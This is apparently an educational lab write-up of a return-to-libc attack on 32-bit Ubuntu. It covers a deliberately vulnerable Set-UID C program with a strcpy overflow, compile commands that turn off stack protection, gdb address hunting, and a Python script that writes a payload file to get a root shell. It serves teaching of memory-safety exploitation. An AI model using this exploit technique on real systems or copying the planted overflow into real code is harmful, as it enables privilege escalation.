---
title: "Return-to-libc Attack"
date: 2021-02-01T18:49:41+08:00
draft: false
---

To prevent buffer overflow attacks, some operating systems allow the programs to make their stacks non-executable, which means if we jump to the stack and run the shellcode, we will fail. The goal of the following experiments is to utilize the variant of buffer overflow attack -- return-to-libc attack and get the root privilege of the shell. 



## Setup

Environment:

1. Google cloud virtual machine: Ubuntu 20.04
2. Linux kernel version: 5.4.0
3. Create a symbolic link from "/bin/zsh" to "/bin/sh" since /bin/dash in most Ubuntu systems prevents itself from being executed in a Set-UID process 
4. Disable ASLR and Stackguard protection, but make the stack non-executable (our purpose of the experiment)



## Vulnerable program 

Here is a vulnerable program called retlib.c. 

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int bof(char* str)
{
	char buffer[12]; 
	unsigned int* framep; 

	asm("movl %%ebp, %0" : "=r" (framep)); 

	printf("ebp value = 0x%.8x\n", (unsigned)framep); 
	printf("buffer address = 0x%.8x\n", (unsigned)buffer); 

	strcpy(buffer, str); 		// buffer overflow
	return 1; 
}

int main(int argc, char** argv)
{
	char input[100]; 
	FILE* badfile; 

	badfile = fopen("badfile", "r"); 
	int len = fread(input, sizeof(char), 100, badfile); 
	printf("input size = %d", len); 

	bof(input); 
	printf("return properly\n"); 

	return 1; 
}
```

Disable ASLR and Stackguard protection, and compile the program into the 32-bit executable. Note that we need to make the stack non-executable, so compile with the flag "-z noexecstack" as follows:

```
$ gcc -m32 -fno-stack-protector -z noexecstack retlib.c -o retlib
$ sudo chown root retlib
$ sudo chmod 4755 retlib
```



## Idea

The idea of the return-to-libc attack is to jump into a function in the library (for example, libc) without running the instruction located in the stack. To get the root privilege of the shell, our goal is to invoke system("/bin/sh") in the libc. So the first thing is to specify where is the function system(). We can use gdb debugger to print out the address of the system() as follows. 

![](https://github.com/chuang76/image/blob/master/ch3-13.PNG?raw=true)

Next, we need to find out where is the string "/bin/sh". One method is to use an environment variable. The reason is that when we execute a program from a shell prompt, the shell actually fork itself and creates a child process to run the program. All the exported environment variables will be *inherited* by the child process. So we can export a self-defined environment variable called "my_shell" which value equals to "/bin/sh", and use a simple program called "prtenv.c" to print out the address. 

```
#include <stdio.h>
#include <stdlib.h>

void main()
{
	char* shell = getenv("my_shell"); 
	if (shell)
		printf("shell = %s, address = 0x%x\n", shell, (unsigned int)shell);
}
```

Compile the program and export the environment variable "my_shell". 

```
$ export my_shell="/bin/sh"
$ gcc -m32 prtenv.c -o prtenv
$ gcc -m32 prtenv.c -o prtaaa
$ gcc -m32 prtenv.c -o prtaaaaa
$ gcc -m32 prtenv.c -g -o prtenv_dbg
```

Here is the result. However, the address of the environment variable is sensitive to the length of the file name. Why? Let's use the debugger to figure out. 

![](https://github.com/chuang76/image/blob/master/ch3-14.PNG?raw=true)

Set a breakpoint at main function and run the program. We can find the address of environment variable with a pointer to pointer [environ](https://man7.org/linux/man-pages/man7/environ.7.html), which points to an array of pointers to strings called the "environment". As you can see, environment variables are located in the stack section. Before environment variables are pushed into the stack, the file name of the program is pushed first. So that's why the address of the environment variable may be affected by the length of the file name. 

```
(gdb) x/100s *((char **)environ)
```

![](https://github.com/chuang76/image/blob/master/ch3-15.PNG?raw=true)

![](https://github.com/chuang76/image/blob/master/ch3-16.PNG?raw=true)

![](https://github.com/chuang76/image/blob/master/ch3-17.PNG?raw=true)



## Exploit

Run the vulnerable program to find out where should we put the address of system(). That is, the value of ebp - the address of buffer + the size of ebp register =  0xffffd4d8 - 0xffffd4c0 + 4 = 28. So our crafted stack frame should looks like this:

![](https://github.com/chuang76/image/blob/master/ch3-19.PNG?raw=true)

Here is our payload: replace the return address of strcmp()'s frame as the address of system() and put the argument of system(), i.e., the address of the string "/bin/sh". Note that it is necessary to fill the return address of system()'s frame with the address of exit(), or the program will crash. 

```
#!/usr/bin/python3

import sys 

content = bytearray(0xaa for i in range(100))

shell_addr = 0xffffdf73
system_addr = 0xf7e13420
exit_addr = 0xf7e05f80 

content[28:32] = (system_addr).to_bytes(4, byteorder='little')
content[32:36] = (exit_addr).to_bytes(4, byteorder='little')
content[36:40] = (shell_addr).to_bytes(4, byteorder='little')

with open("badfile", "wb") as f:
    f.write(content)
```

So we can get the root privilege of the shell. 

![](https://github.com/chuang76/image/blob/master/ch3-18.PNG?raw=true)



## Reference

1. Programs, Processes and Memory [[link]](https://www.usna.edu/Users/cs/wcbrown/courses/IC221/classes/L08/Class.html)